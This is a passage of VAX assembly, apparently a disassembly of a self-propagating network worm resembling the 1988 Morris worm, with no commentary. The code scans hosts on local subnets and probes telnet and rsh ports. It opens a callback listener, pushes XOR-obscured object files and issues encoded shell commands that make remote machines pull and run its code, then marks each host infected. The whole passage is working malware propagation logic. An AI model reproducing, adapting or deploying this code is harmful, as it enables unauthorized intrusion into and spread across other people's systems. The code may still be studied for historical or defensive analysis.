	movl	-0x4(fp),r0
	addl3	$0x30,_me,r1	#  global sym _me#
	ashl	$0x2,r0,r0
	addl2	r0,r1
	pushl	(r1)
	calls	$0x1,_netmaskfor	#  global routine _netmaskfor#
	mcoml	r0,r0
	movl	r0,-0x8(fp)
	movl	-0x4(fp),r0
	addl3	$0x30,_me,r1	#  global sym _me#
	ashl	$0x2,r0,r0
	addl2	r0,r1
	bicl3	-0x8(fp),(r1),r0
	pushl	r0
	calls	$0x1,0x12FC
	tstl	r0
	beql	LL3
	movl	$0x1,r0
	ret
LL3:
	incl	-0x4(fp)
	brb	LL4
LL1:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x8,sp
	brb	LL5
####  END PROC ####

#### start of global routine "_hi" ####
	.data
	.text
	.align	1
	.globl	 _hi
_hi:
	.word	S35
	.set	S35,0x0
	brb	LL0
LL4:
	movl	_hosts,-0x4(fp)	#  global sym _hosts#
LL3:
	tstl	-0x4(fp)
	beql	LL1
	movl	-0x4(fp),r0
	bitl	$0x8,0x48(r0)
	beql	LL2
	pushl	-0x4(fp)
	calls	$0x1,0x1638
	tstl	r0
	beql	LL2
	movl	$0x1,r0
	ret
LL2:
	movl	-0x4(fp),r0
	movl	0x4C(r0),-0x4(fp)
	brb	LL3
LL1:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x4,sp
	brb	LL4
	halt
	halt
	halt
	brw	LL5
LL24:
	pushl	0x4(ap)
	calls	$0x1,_netmaskfor	#  global routine _netmaskfor#
	movl	r0,-0xC(fp)
	pushl	-0xC(fp)
	calls	$0x1,_ntohl	#  global routine _ntohl#
	mcoml	r0,r0
	movl	r0,-0x10(fp)
	clrf	-0x18(fp)
LL8:
	cmpl	-0x18(fp),_nifs	#  global sym _nifs#
	bgeq	LL6
	movl	-0x18(fp),r0
	ashl	$0x5,r0,r0
	movl	-0x18(fp),r1
	ashl	$0x5,r1,r1
	movl	_ifs+0x18,r1	#  global data segment#
	mcoml	r1,r1
	bicl3	r1,_ifs+0x10,r0	#  global data segment#
	cmpl	0x4(ap),r0
	bneq	LL7
	clrf	r0
	ret
LL7:
	incl	-0x18(fp)
	brb	LL8
LL6:
	clrf	-0x20(fp)
	cmpl	-0x10(fp),$0xFFFFFF
	bneq	LL9
	movl	$0x4,-0x2C(fp)
	movl	$0x1,-0x28(fp)
LL13:
	cmpl	-0x28(fp),$0xFF
	bgeq	LL10
	movl	$0x1,-0x14(fp)
LL12:
	cmpl	-0x14(fp),$0x8
	bgtru	LL11
	ashl	$0x10,-0x14(fp),r0
	bisl2	-0x28(fp),r0
	pushl	r0
	calls	$0x1,_htonl	#  global routine _htonl#
	bisl2	0x4(ap),r0
	movl	-0x20(fp),r1
	movl	r0,-0x202C(fp)[r1]
	incl	-0x20(fp)
	incl	-0x14(fp)
	brb	LL12
LL11:
	incl	-0x28(fp)
	brb	LL13
LL10:
	pushl	$0x4
	pushl	-0x20(fp)
	subl3	$0x202C,fp,r0
	pushl	r0
	calls	$0x3,_permute	#  global routine _permute#
	brb	LL14
LL9:
	movl	$0x4,-0x2C(fp)
	movl	$0x1,-0x14(fp)
LL16:
	cmpl	-0x14(fp),$0xFF
	bgequ	LL15
	pushl	-0x14(fp)
	calls	$0x1,_htonl	#  global routine _htonl#
	bisl2	0x4(ap),r0
	movl	-0x20(fp),r1
	movl	r0,-0x202C(fp)[r1]
	incl	-0x20(fp)
	incl	-0x14(fp)
	brb	LL16
LL15:
	pushl	$0x4
	pushl	$0xC
	subl3	$0x202C,fp,r0
	pushl	r0
	calls	$0x3,_permute	#  global routine _permute#
	pushl	$0x4
	subl3	$0x6,-0x20(fp),r0
	pushl	r0
	subl3	$0x2014,fp,r0
	pushl	r0
	calls	$0x3,_permute	#  global routine _permute#
LL14:
	cmpl	-0x20(fp),$0x14
	bleq	LL17
	movl	$0x14,-0x20(fp)
LL17:
	clrf	-0x24(fp)
LL23:
	cmpl	-0x24(fp),-0x20(fp)
	bgeq	LL18
	movl	-0x24(fp),r0
	movl	-0x202C(fp)[r0],-0x4(fp)
	pushl	$0x0
	pushl	-0x4(fp)
	calls	$0x2,_h_addr2host	#  global routine _h_addr2host#
	movl	r0,-0x8(fp)
	tstl	-0x8(fp)
	beql	LL19
	movl	-0x8(fp),r0
	bitl	$0x2,0x48(r0)
	beql	LL19
	brb	LL20
LL19:
	tstl	-0x8(fp)
	beql	LL21
	movl	-0x8(fp),r0
	bitl	$0x4,0x48(r0)
	beql	LL21
	brb	LL20
LL21:
	pushl	-0x2C(fp)
	pushl	-0x4(fp)
	calls	$0x2,0x14C8
	tstl	r0
	beql	LL20
	tstl	-0x8(fp)
	bneq	LL22
	pushl	$0x1
	pushl	-0x4(fp)
	calls	$0x2,_h_addr2host	#  global routine _h_addr2host#
	movl	r0,-0x8(fp)
LL22:
	pushl	-0x8(fp)
	calls	$0x1,0x1638
	tstl	r0
	beql	LL20
	movl	$0x1,r0
	ret
LL20:
	incl	-0x24(fp)
	brw	LL23
LL18:
	clrf	r0
	ret
	ret
LL5:
	movab	-0x202C(sp),sp
	brw	LL24
	halt
	halt
	halt
	brw	LL25
LL31:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL26
	clrf	r0
	ret
LL26:
	pushl	$0x10
	subl3	$0x18,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x18(fp)
	movl	0x4(ap),-0x14(fp)
	pushl	$0x202
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x16(fp)
	pushl	$_justreturn	#  global sym _justreturn#
	pushl	$0xE
	calls	$0x2,_signal	#  global routine _signal#
	movl	r0,-0x1C(fp)
	cmpl	0x8(ap),$0x1
	bgeq	LL27
	movl	$0x1,0x8(ap)
LL27:
	pushl	0x8(ap)
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	$0x10
	subl3	$0x18,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_connect	#  global routine _connect#
	movl	r0,-0x8(fp)
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	tstl	-0x8(fp)
	bgeq	LL28
	cmpl	_errno,$0x33	#  global sym _errno#
	bneq	LL28
LL28:
	cmpl	-0x8(fp),$-0x1
	beql	LL29
	movl	$0x1,r0
	brb	LL30
LL29:
	clrf	r0
LL30:
	ret
	ret
LL25:
	subl2	$0x1C,sp
	brw	LL31
	halt
	halt
	brw	LL32
LL37:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL33
	clrf	r0
	ret
LL33:
	pushl	$0x10
	subl3	$0x18,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x18(fp)
	movl	0x4(ap),-0x14(fp)
	pushl	$0x17
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x16(fp)
	pushl	$_justreturn	#  global sym _justreturn#
	pushl	$0xE
	calls	$0x2,_signal	#  global routine _signal#
	movl	r0,-0x1C(fp)
	pushl	$0x5
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	$0x10
	subl3	$0x18,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_connect	#  global routine _connect#
	movl	r0,-0x8(fp)
	tstl	-0x8(fp)
	bgeq	LL34
	cmpl	_errno,$0x3D	#  global sym _errno#
	bneq	LL34
	clrf	-0x8(fp)
LL34:
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	cmpl	-0x8(fp),$-0x1
	beql	LL35
	movl	$0x1,r0
	brb	LL36
LL35:
	clrf	r0
LL36:
	ret
	ret
LL32:
	subl2	$0x1C,sp
	brw	LL37
	halt
	halt
	brw	LL38
LL48:
	cmpl	0x4(ap),_me	#  global sym _me#
	bneq	LL39
	clrf	r0
	ret
LL39:
	movl	0x4(ap),r0
	bitl	$0x2,0x48(r0)
	beql	LL40
	clrf	r0
	ret
LL40:
	movl	0x4(ap),r0
	bitl	$0x4,0x48(r0)
	beql	LL41
	clrf	r0
	ret
LL41:
	movl	0x4(ap),r0
	tstl	0x30(r0)
	beql	LL42
	tstl	*0x4(ap)
	bneq	LL43
LL42:
	pushl	0x4(ap)
	calls	$0x1,_getaddrs	#  global routine _getaddrs#
LL43:
	movl	0x4(ap),r0
	tstl	0x30(r0)
	bneq	LL44
	movl	0x4(ap),r0
	bisl2	$0x4,0x48(r0)
	clrf	r0
	ret
LL44:
	pushl	$0x1
	calls	$0x1,_other_sleep	#  global routine _other_sleep#
	tstl	*0x4(ap)
	beql	LL45
	pushl	$mcount+0x8C	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x8,fp,r0
	pushl	r0
	subl3	$0x4,fp,r0
	pushl	r0
	pushl	*0x4(ap)
	calls	$0x4,0x21E0
	tstl	r0
	beql	LL45
	pushl	-0x8(fp)
	pushl	-0x4(fp)
	pushl	0x4(ap)
	calls	$0x3,0x1776
	movl	r0,-0xC(fp)
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x8(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	$0x0
	pushl	$0x1
	pushl	$0x0
	calls	$0x3,_wait3	#  global routine _wait3#
	tstl	-0xC(fp)
	beql	LL45
	movl	-0xC(fp),r0
	ret
LL45:
	subl3	$0x8,fp,r0
	pushl	r0
	subl3	$0x4,fp,r0
	pushl	r0
	pushl	0x4(ap)
	calls	$0x3,0x25EC
	tstl	r0
	beql	LL46
	pushl	-0x8(fp)
	pushl	-0x4(fp)
	pushl	0x4(ap)
	calls	$0x3,0x1776
	movl	r0,-0xC(fp)
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x8(fp)
	calls	$0x1,_close	#  global routine _close#
	tstl	-0xC(fp)
	beql	LL46
	movl	-0xC(fp),r0
	ret
LL46:
	pushl	0x4(ap)
	calls	$0x1,0x28A8
	tstl	r0
	beql	LL47
	movl	$0x1,r0
	ret
LL47:
	movl	0x4(ap),r0
	bisl2	$0x4,0x48(r0)
	clrf	r0
	ret
	ret
LL38:
	subl2	$0xC,sp
	brw	LL48
	halt
	halt
	brw	LL49
LL54:
	pushl	$mcount+0x99	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x1,_getobjectbyname	#  global routine _getobjectbyname#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL50
	clrf	r0
	ret
LL50:
	subl3	$0x24C,fp,r0
	pushl	r0
	subl3	$0x248,fp,r0
	pushl	r0
	subl3	$0x244,fp,r0
	pushl	r0
	subl3	$0x250,fp,r0
	pushl	r0
	pushl	0x4(ap)
	calls	$0x5,_makemagic	#  global routine _makemagic#
	tstl	r0
	bneq	LL51
	clrf	r0
	ret
LL51:
	pushl	$mcount+0x9E	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0xC(ap)
	calls	$0x2,0x21BE
	pushl	$mcount+0xBB	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0xC(ap)
	calls	$0x2,0x21BE
	calls	$0x0,_random	#  global routine _random#
	divl3	$0xFFFFFF,r0,r1
	mull2	$0xFFFFFF,r1
	subl3	r1,r0,r1
	movl	r1,-0x240(fp)
	pushl	-0x240(fp)
	pushl	$mcount+0xC8	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x236,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0x236,fp,r0
	pushl	r0
	pushl	$mcount+0xCE	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	0xC(ap)
	calls	$0x2,0x21BE
	pushl	$0xA
	pushl	$mcount+0xFF	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0x8(ap)
	calls	$0x3,0x2462
	movl	-0x4(fp),r0
	pushl	0x4(r0)
	movl	-0x4(fp),r0
	pushl	0x8(r0)
	calls	$0x2,_xorbuf	#  global routine _xorbuf#
	movl	-0x4(fp),r0
	pushl	0x4(r0)
	movl	-0x4(fp),r0
	pushl	0x8(r0)
	pushl	0xC(ap)
	calls	$0x3,_write	#  global routine _write#
	movl	r0,-0x23C(fp)
	movl	-0x4(fp),r0
	pushl	0x4(r0)
	movl	-0x4(fp),r0
	pushl	0x8(r0)
	calls	$0x2,_xorbuf	#  global routine _xorbuf#
	movl	-0x4(fp),r0
	cmpl	-0x23C(fp),0x4(r0)
	beql	LL52
	pushl	-0x24C(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL52:
	pushl	$mcount+0x107	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0xC(ap)
	calls	$0x2,0x21BE
	pushl	$0x1E
	pushl	$mcount+0x111	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0x8(ap)
	calls	$0x3,0x2462
	pushl	-0x240(fp)
	pushl	-0x240(fp)
	pushl	-0x248(fp)
	pushl	-0x244(fp)
	calls	$0x1,_htons	#  global routine _htons#
	pushl	r0
	pushl	-0x250(fp)
	calls	$0x1,_a2in	#  global routine _a2in#
	subl2	$0x4,sp
	movl	(r0),(sp)
	calls	$0x1,_inet_ntoa	#  global routine _inet_ntoa#
	pushl	r0
	pushl	-0x240(fp)
	pushl	-0x240(fp)
	pushl	-0x240(fp)
	pushl	$mcount+0x119	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0xA,_sprintf	#  global routine _sprintf#
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	0xC(ap)
	calls	$0x2,0x21BE
	pushl	$0x64
	pushl	$mcount+0x153	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0x8(ap)
	calls	$0x3,0x2462
	tstl	r0
	bneq	LL53
	pushl	-0x24C(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL53:
	pushl	-0x24C(fp)
	pushl	-0x248(fp)
	pushl	-0x244(fp)
	pushl	-0x250(fp)
	pushl	0x4(ap)
	calls	$0x5,_waithit	#  global routine _waithit#
	ret
	ret
LL49:
	movab	-0x250(sp),sp
	brw	LL54
	halt
####  END PROC ####

#### start of global routine "_makemagic" ####
	.data
	.text
	.align	1
	.globl	 _makemagic
_makemagic:
	.word	S37
	.set	S37,0x0
	brw	LL0
LL13:
	calls	$0x0,_random	#  global routine _random#
	bicl2	$0xFF000000,r0
	movl	r0,*0x10(ap)
	pushl	$0x10
	subl3	$0x2C,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	movl	_me,r0	#  global sym _me#
	movl	0x30(r0),-0x28(fp)
	clrf	-0x8(fp)
LL7:
	cmpl	-0x8(fp),$0x6
	blss	LL1
	brw	LL2
LL1:
	movl	-0x8(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	bneq	LL3
	brw	LL4
LL3:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL5
	clrf	r0
	ret
LL5:
	pushl	$0x10
	subl3	$0x1C,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x1C(fp)
	pushl	$0x17
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x1A(fp)
	movl	-0x8(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	movl	(r1),-0x18(fp)
	clrf	_errno	#  global sym _errno#
	pushl	$0x10
	subl3	$0x1C,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_connect	#  global routine _connect#
	cmpl	r0,$-0x1
	beql	LL6
	movl	$0x10,-0xC(fp)
	subl3	$0xC,fp,r0
	pushl	r0
	subl3	$0x2C,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_getsockname	#  global routine _getsockname#
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL2
LL6:
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
LL4:
	incl	-0x8(fp)
	brw	LL7
LL2:
	movl	-0x28(fp),*0x8(ap)
	clrf	-0x8(fp)
LL12:
	cmpl	-0x8(fp),$0x400
	blss	LL8
	brw	LL9
LL8:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL10
	clrf	r0
	ret
LL10:
	pushl	$0x10
	subl3	$0x1C,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x1C(fp)
	calls	$0x0,_random	#  global routine _random#
	divl3	$0x7FFF,r0,r1
	mull2	$0x7FFF,r1
	subl3	r1,r0,r1
	pushl	r1
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x1A(fp)
	pushl	$0x10
	subl3	$0x1C,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_bind	#  global routine _bind#
	cmpl	r0,$-0x1
	beql	LL11
	pushl	$0xA
	pushl	-0x4(fp)
	calls	$0x2,_listen	#  global routine _listen#
	movzwl	-0x1A(fp),*0xC(ap)
	movl	-0x4(fp),*0x14(ap)
	movl	$0x1,r0
	ret
LL11:
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	incl	-0x8(fp)
	brw	LL12
LL9:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0x2C,sp
	brw	LL13
####  END PROC ####

#### start of global routine "_waithit"	####
	.data
	.text
	.align	1
	.globl	 _waithit
_waithit:
	.word	S39
	.set	S39,0x0
	brw	LL0
LL23:
	pushl	$_justreturn	#  global sym _justreturn#
	pushl	$0xE
	calls	$0x2,_signal	#  global routine _signal#
	movl	r0,-0x4(fp)
	movl	$0x10,-0xC(fp)
	pushl	$0x78
	calls	$0x1,_alarm	#  global routine _alarm#
	subl3	$0xC,fp,r0
	pushl	r0
	subl3	$0x2C,fp,r0
	pushl	r0
	pushl	0x14(ap)
	calls	$0x3,_accept	#  global routine _accept#
	movl	r0,-0x8(fp)
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	tstl	-0x8(fp)
	bgeq	LL1
	brw	LL2
LL1:
	pushl	$0xA
	pushl	$0x4
	subl3	$0x10,fp,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x4,_xread	#  global routine _xread#
	cmpl	r0,$0x4
	beql	LL3
	brw	LL2
LL3:
	pushl	-0x10(fp)
	calls	$0x1,_ntohl	#  global routine _ntohl#
	movl	r0,-0x10(fp)
	cmpl	-0x10(fp),0x10(ap)
	beql	LL4
	brw	LL2
LL4:
	clrf	-0x14(fp)
LL8:
	cmpl	-0x14(fp),_nobjects	#  global sym _nobjects#
	blss	LL5
	brw	LL6
LL5:
	mull3	$0xC,-0x14(fp),r0
	addl2	$_objects,r0	#  global sym _objects#
	movl	r0,-0x30(fp)
	movl	-0x30(fp),r0
	pushl	0x4(r0)
	calls	$0x1,_htonl	#  global routine _htonl#
	movl	r0,-0x10(fp)
	pushl	$0x4
	subl3	$0x10,fp,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x3,_write	#  global routine _write#
	pushl	*-0x30(fp)
	calls	$0x0,_random	#  global routine _random#
	bicl2	$0xFF000000,r0
	pushl	r0
	pushl	$mcount+0x158	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xA30,fp,r0
	ashl	$0x7,-0x14(fp),r1
	addl2	r1,r0
	pushl	r0
	calls	$0x4,_sprintf	#  global routine _sprintf#
	pushl	$0x80
	subl3	$0xA30,fp,r0
	ashl	$0x7,-0x14(fp),r1
	addl2	r1,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x3,_write	#  global routine _write#
	movl	-0x30(fp),r0
	pushl	0x4(r0)
	movl	-0x30(fp),r0
	pushl	0x8(r0)
	calls	$0x2,_xorbuf	#  global routine _xorbuf#
	movl	-0x30(fp),r0
	pushl	0x4(r0)
	movl	-0x30(fp),r0
	pushl	0x8(r0)
	pushl	-0x8(fp)
	calls	$0x3,_write	#  global routine _write#
	movl	r0,-0x18(fp)
	movl	-0x30(fp),r0
	pushl	0x4(r0)
	movl	-0x30(fp),r0
	pushl	0x8(r0)
	calls	$0x2,_xorbuf	#  global routine _xorbuf#
	movl	-0x30(fp),r0
	cmpl	-0x18(fp),0x4(r0)
	beql	LL7
	brw	LL2
LL7:
	incl	-0x14(fp)
	brw	LL8
LL6:
	pushl	$-0x1
	calls	$0x1,_htonl	#  global routine _htonl#
	movl	r0,-0x10(fp)
	pushl	$0x4
	subl3	$0x10,fp,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x3,_write	#  global routine _write#
	cmpl	r0,$0x4
	beql	LL9
	brw	LL2
LL9:
	pushl	$0x4
	calls	$0x1,_sleep	#  global routine _sleep#
	pushl	$0x1E
	pushl	-0x8(fp)
	pushl	-0x8(fp)
	calls	$0x3,0x23CE
	tstl	r0
	bneq	LL10
	brw	LL2
LL10:
	pushl	$mcount+0x15F	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x2,0x21BE
	pushl	$mcount+0x17C	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x2,0x21BE
	calls	$0x0,_random	#  global routine _random#
	bicl2	$0xFF000000,r0
	pushl	r0
	pushl	$mcount+0x186	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xC34,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0xC34,fp,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x2,0x21BE
	clrf	-0x14(fp)
LL20:
	cmpl	-0x14(fp),_nobjects	#  global sym _nobjects#
	blss	LL11
	brw	LL12
LL11:
	pushl	$0x2E
	subl3	$0xA30,fp,r0
	ashl	$0x7,-0x14(fp),r1
	addl2	r1,r0
	pushl	r0
	calls	$0x2,_index	#  global routine _index#
	movl	r0,-0xA34(fp)
	beql	LL13
	movl	-0xA34(fp),r0
	cmpb	0x1(r0),$0x6F
	beql	LL14
LL13:
	brw	LL15
LL14:
	subl3	$0xA30,fp,r0
	ashl	$0x7,-0x14(fp),r1
	addl2	r1,r0
	pushl	r0
	pushl	$mcount+0x1AC	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xC34,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0xC34,fp,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x2,0x21BE
	pushl	$0x1E
	pushl	-0x8(fp)
	pushl	-0x8(fp)
	calls	$0x3,0x23CE
	tstl	r0
	bneq	LL16
	brw	LL2
LL16:
	pushl	$mcount+0x1B9	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xC34,fp,r0
	pushl	r0
	calls	$0x2,_sprintf	#  global routine _sprintf#
	clrf	-0x1C(fp)
LL18:
	cmpl	-0x1C(fp),_nobjects	#  global sym _nobjects#
	bgeq	LL17
	subl3	$0xA30,fp,r0
	ashl	$0x7,-0x1C(fp),r1
	addl2	r1,r0
	pushl	r0
	subl3	$0xC34,fp,r0
	pushl	r0
	calls	$0x2,_strcat	#  global routine _strcat#
	pushl	$mcount+0x1C5	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xC34,fp,r0
	pushl	r0
	calls	$0x2,_strcat	#  global routine _strcat#
	incl	-0x1C(fp)
	brb	LL18
LL17:
	pushl	$mcount+0x1C7	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xC34,fp,r0
	pushl	r0
	calls	$0x2,_strcat	#  global routine _strcat#
	subl3	$0xC34,fp,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x2,0x21BE
	pushl	$0xA
	pushl	-0x8(fp)
	pushl	-0x8(fp)
	calls	$0x3,0x23CE
	tstl	r0
	bneq	LL19
	pushl	-0x8(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	0x14(ap)
	calls	$0x1,_close	#  global routine _close#
	movl	0x4(ap),r0
	bisl2	$0x2,0x48(r0)
	movl	$0x1,r0
	ret
LL19:
	pushl	$mcount+0x1C9	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x2,0x21BE
LL15:
	incl	-0x14(fp)
	brw	LL20
LL12:
	clrf	-0x14(fp)
LL22:
	cmpl	-0x14(fp),_nobjects	#  global sym _nobjects#
	bgeq	LL21
	subl3	$0xA30,fp,r0
	ashl	$0x7,-0x14(fp),r1
	addl2	r1,r0
	pushl	r0
	pushl	$mcount+0x1D3	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xC34,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0xC34,fp,r0
	pushl	r0
	pushl	-0x8(fp)
	calls	$0x2,0x21BE
	incl	-0x14(fp)
	brb	LL22
LL21:
	pushl	$0x5
	pushl	-0x8(fp)
	pushl	-0x8(fp)
	calls	$0x3,0x23CE
LL2:
	pushl	-0x8(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	0x14(ap)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
	ret
LL0:
	movab	-0xC34(sp),sp
	brw	LL23
	halt
	halt
	brw	LL24
LL27:
	pushl	$mcount+0x1E0	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x1,_getobjectbyname	#  global routine _getobjectbyname#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bneq	LL25
	clrf	r0
	ret
LL25:
	pushl	$mcount+0x1E5	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0x8(ap)
	calls	$0x2,0x21BE
	calls	$0x0,_random	#  global routine _random#
	divl3	$0xFFFFFF,r0,r1
	mull2	$0xFFFFFF,r1
	subl3	r1,r0,r1
	movl	r1,-0x240(fp)
	pushl	-0x240(fp)
	pushl	$mcount+0x1F2	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x236,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0x236,fp,r0
	pushl	r0
	pushl	$mcount+0x1F8	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	0x8(ap)
	calls	$0x2,0x21BE
	movl	-0x4(fp),r0
	pushl	0x4(r0)
	movl	-0x4(fp),r0
	pushl	0x8(r0)
	calls	$0x2,_xorbuf	#  global routine _xorbuf#
	movl	-0x4(fp),r0
	pushl	0x4(r0)
	movl	-0x4(fp),r0
	pushl	0x8(r0)
	pushl	0x8(ap)
	calls	$0x3,_write	#  global routine _write#
	movl	r0,-0x23C(fp)
	movl	-0x4(fp),r0
	pushl	0x4(r0)
	movl	-0x4(fp),r0
	pushl	0x8(r0)
	calls	$0x2,_xorbuf	#  global routine _xorbuf#
	movl	-0x4(fp),r0
	cmpl	-0x23C(fp),0x4(r0)
	beql	LL26
	clrf	r0
	ret
LL26:
	pushl	$mcount+0x20A	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	0x8(ap)
	calls	$0x2,0x21BE
	pushl	-0x240(fp)
	pushl	-0x240(fp)
	pushl	0x14(ap)
	pushl	0x10(ap)
	calls	$0x1,_htons	#  global routine _htons#
	pushl	r0
	pushl	0xC(ap)
	calls	$0x1,_a2in	#  global routine _a2in#
	subl2	$0x4,sp
	movl	(r0),(sp)
	calls	$0x1,_inet_ntoa	#  global routine _inet_ntoa#
	pushl	r0
	pushl	-0x240(fp)
	pushl	-0x240(fp)
	pushl	-0x240(fp)
	pushl	$mcount+0x20F	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x204,fp,r0
	pushl	r0
	calls	$0xA,_sprintf	#  global routine _sprintf#
	subl3	$0x204,fp,r0
	pushl	r0
	pushl	0x8(ap)
	calls	$0x2,0x21BE
	ret
LL24:
	movab	-0x240(sp),sp
	brw	LL27
	halt
	halt
	halt
	brb	LL28
LL29:
	pushl	0x8(ap)
	calls	$0x1,_strlen	#  global routine _strlen#
	pushl	r0
	pushl	0x8(ap)
	pushl	0x4(ap)
	calls	$0x3,_write	#  global routine _write#
	ret
	ret
LL28:
	brb	LL29
	halt
	halt
